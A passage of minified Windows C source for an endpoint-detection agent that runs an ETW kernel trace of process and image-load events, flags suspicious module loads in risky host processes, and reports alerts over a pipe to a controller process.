cnow=GetTickCount();cb_accum(pid,"USERMODULELOAD",g_mod_score,cnow);combo_eval(pid,module,cnow);}if(!process_path(pid,host,MAX_PATH)||!risky_host(host)||exempt(host))return;now=(ULONGLONG)GetTickCount();EnterCriticalSection(&g_lock);for(i=0;i<g_hit_count;i++)if(g_hits[i].pid==pid&&now-g_hits[i].tick<30000&&_wcsicmp(g_hits[i].module,module)!=0){hit=1;break;}if(!hit&&g_hit_count<MAX_HITS){g_hits[g_hit_count].pid=pid;g_hits[g_hit_count].tick=now;lstrcpynW(g_hits[g_hit_count].module,module,MAX_PATH);g_hit_count++;}for(i=0;i<g_hit_count;i++)if(now-g_hits[i].tick>30000){g_hits[i]=g_hits[--g_hit_count];i--;}LeaveCriticalSection(&g_lock);if(hit)send_alert(pid,module);}
static DWORD WINAPI parent_watch(LPVOID x){HANDLE h;(void)x;h=OpenProcess(SYNCHRONIZE,FALSE,g_parent);if(h){WaitForSingleObject(h,INFINITE);CloseHandle(h);}InterlockedExchange(&g_running,0);if(g_pipe_handle!=INVALID_HANDLE_VALUE)CloseHandle(g_pipe_handle);if(pControl&&g_session_handle){pControl(g_session_handle,g_session,g_props,1);}return 0;}
static int load_api(void){HMODULE a=LoadLibraryW(L"advapi32.dll"),t=LoadLibraryW(L"tdh.dll"),k=GetModuleHandleW(L"kernel32.dll");if(!a||!t||!k)return 0;pStart=(PFN_START)GetProcAddress(a,"StartTraceW");pControl=(PFN_CONTROL)GetProcAddress(a,"ControlTraceW");pOpen=(PFN_OPEN)GetProcAddress(a,"OpenTraceW");pProcess=(PFN_PROCESS)GetProcAddress(a,"ProcessTrace");pClose=(PFN_CLOSE)GetProcAddress(a,"CloseTrace");pTdhInfo=(PFN_TDH_INFO)GetProcAddress(t,"TdhGetEventInformation");pTdhSize=(PFN_TDH_SIZE)GetProcAddress(t,"TdhGetPropertySize");pTdhGet=(PFN_TDH_GET)GetProcAddress(t,"TdhGetProperty");pQueryImage=(PFN_QUERY_IMAGE)GetProcAddress(k,"QueryFullProcessImageNameW");return pStart&&pControl&&pOpen&&pProcess&&pClose&&pTdhInfo&&pTdhSize&&pTdhGet&&pQueryImage;}
int wmain(int argc,WCHAR**argv){ULONG sz=(ULONG)(sizeof(EVENT_TRACE_PROPERTIES_L)+512),rc;EVENT_TRACE_PROPERTIES_L*p;EVENT_TRACE_LOGFILE_L log;TRACEHANDLE session=0,trace;WCHAR env[32];WCHAR wrules[MAX_PATH];DWORD wrn;InitializeCriticalSection(&g_lock);wrn=GetModuleFileNameW(NULL,wrules,MAX_PATH);if(wrn&&wrn<MAX_PATH){WCHAR*sl=wcsrchr(wrules,L'\\');if(sl)*(sl+1)=0;wcscat(wrules,L"agent_rules.json");wcstombs(g_rules_path,wrules,MAX_PATH-1);}if(GetEnvironmentVariableW(L"SEVEN_AGENT_RULES",env,32)){char vpath[MAX_PATH];wcstombs(vpath,env,MAX_PATH-1);strncpy(g_rules_path,vpath,MAX_PATH-1);g_rules_path[MAX_PATH-1]=0;}if(argc>=2&&!_wcsicmp(argv[1],L"--SelfTest")){v2_load();return v2_selftest();}if(argc>=2&&!_wcsicmp(argv[1],L"--Agent"))v2_load();if(argc<2||_wcsicmp(argv[1],L"--Agent")){fwprintf(stderr,L"Usage: SevenAgent.exe --Agent\n");return 64;}if(GetEnvironmentVariableW(L"SEVEN_PARENT_PID",env,32))g_parent=wcstoul(env,NULL,10);if(!g_parent)g_parent=find_controller();if(!g_parent){fwprintf(stderr,L"[SevenAgent] Waiting for SevenEndPoint.exe; retrying controller discovery.\n");for(;;){Sleep(2000);g_parent=find_controller();if(g_parent)break;}}if(!load_api()){fwprintf(stderr,L"[SevenAgent] ETW/TDH APIs unavailable.\n");return 11;}p=(EVENT_TRACE_PROPERTIES_L*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sz);if(!p)return 12;p->Wnode.BufferSize=sz;p->Wnode.Flags=WNODE_FLAG_TRACED_GUID;p->Wnode.ClientContext=1;p->Wnode.Guid.Data1=0x9e814aad;p->Wnode.Guid.Data2=0x3204;p->Wnode.Guid.Data3=0x11d2;p->Wnode.Guid.Data4[0]=0x9a;p->Wnode.Guid.Data4[1]=0x82;p->Wnode.Guid.Data4[2]=0x00;p->Wnode.Guid.Data4[3]=0x60;p->Wnode.Guid.Data4[4]=0x08;p->Wnode.Guid.Data4[5]=0xa8;p->Wnode.Guid.Data4[6]=0x69;p->Wnode.Guid.Data4[7]=0x39;p->LogFileMode=EVENT_TRACE_REAL_TIME_MODE|EVENT_TRACE_SYSTEM_LOGGER_MODE;p->EnableFlags=EVENT_TRACE_FLAG_PROCESS|EVENT_TRACE_FLAG_IMAGE_LOAD;p->LoggerNameOffset=sizeof(EVENT_TRACE_PROPERTIES_L);rc=pStart(&session,g_session,p);if(rc==ERROR_ALREADY_EXISTS){ULONG st=pControl(0,g_session,p,1);fwprintf(stderr,L"[SevenAgent] Kernel logger busy(183); self-heal stop rc=%lu\n",st);Sleep(150);rc=pStart(&session,g_session,p);}if(rc){fwprintf(stderr,L"[SevenAgent] StartTrace failed: %lu\n",rc);return (int)rc;}g_session_handle=session;g_props=p;ZeroMemory(&log,sizeof(log));log.LoggerName=g_session;log.ProcessTraceMode=PROCESS_TRACE_MODE_REAL_TIME|PROCESS_TRACE_MODE_EVENT_RECORD;log.EventRecordCallback=on_record;trace=pOpen(&log);if(trace==(TRACEHANDLE)-1){pControl(session,g_session,p,1);return 13;}if(!pipe_connect()){pControl(session,g_session,p,1);return 14;}CreateThread(NULL,0,parent_watch,NULL,0,NULL);fwprintf(stderr,L"[SevenAgent] ETW ready; controller PID=%lu\n",g_parent);fflush(stderr);pProcess(&trace,1,NULL,NULL);pClose(trace);pControl(session,g_session,p,1);HeapFree(GetProcessHeap(),0,p);DeleteCriticalSection(&g_lock);return 0;}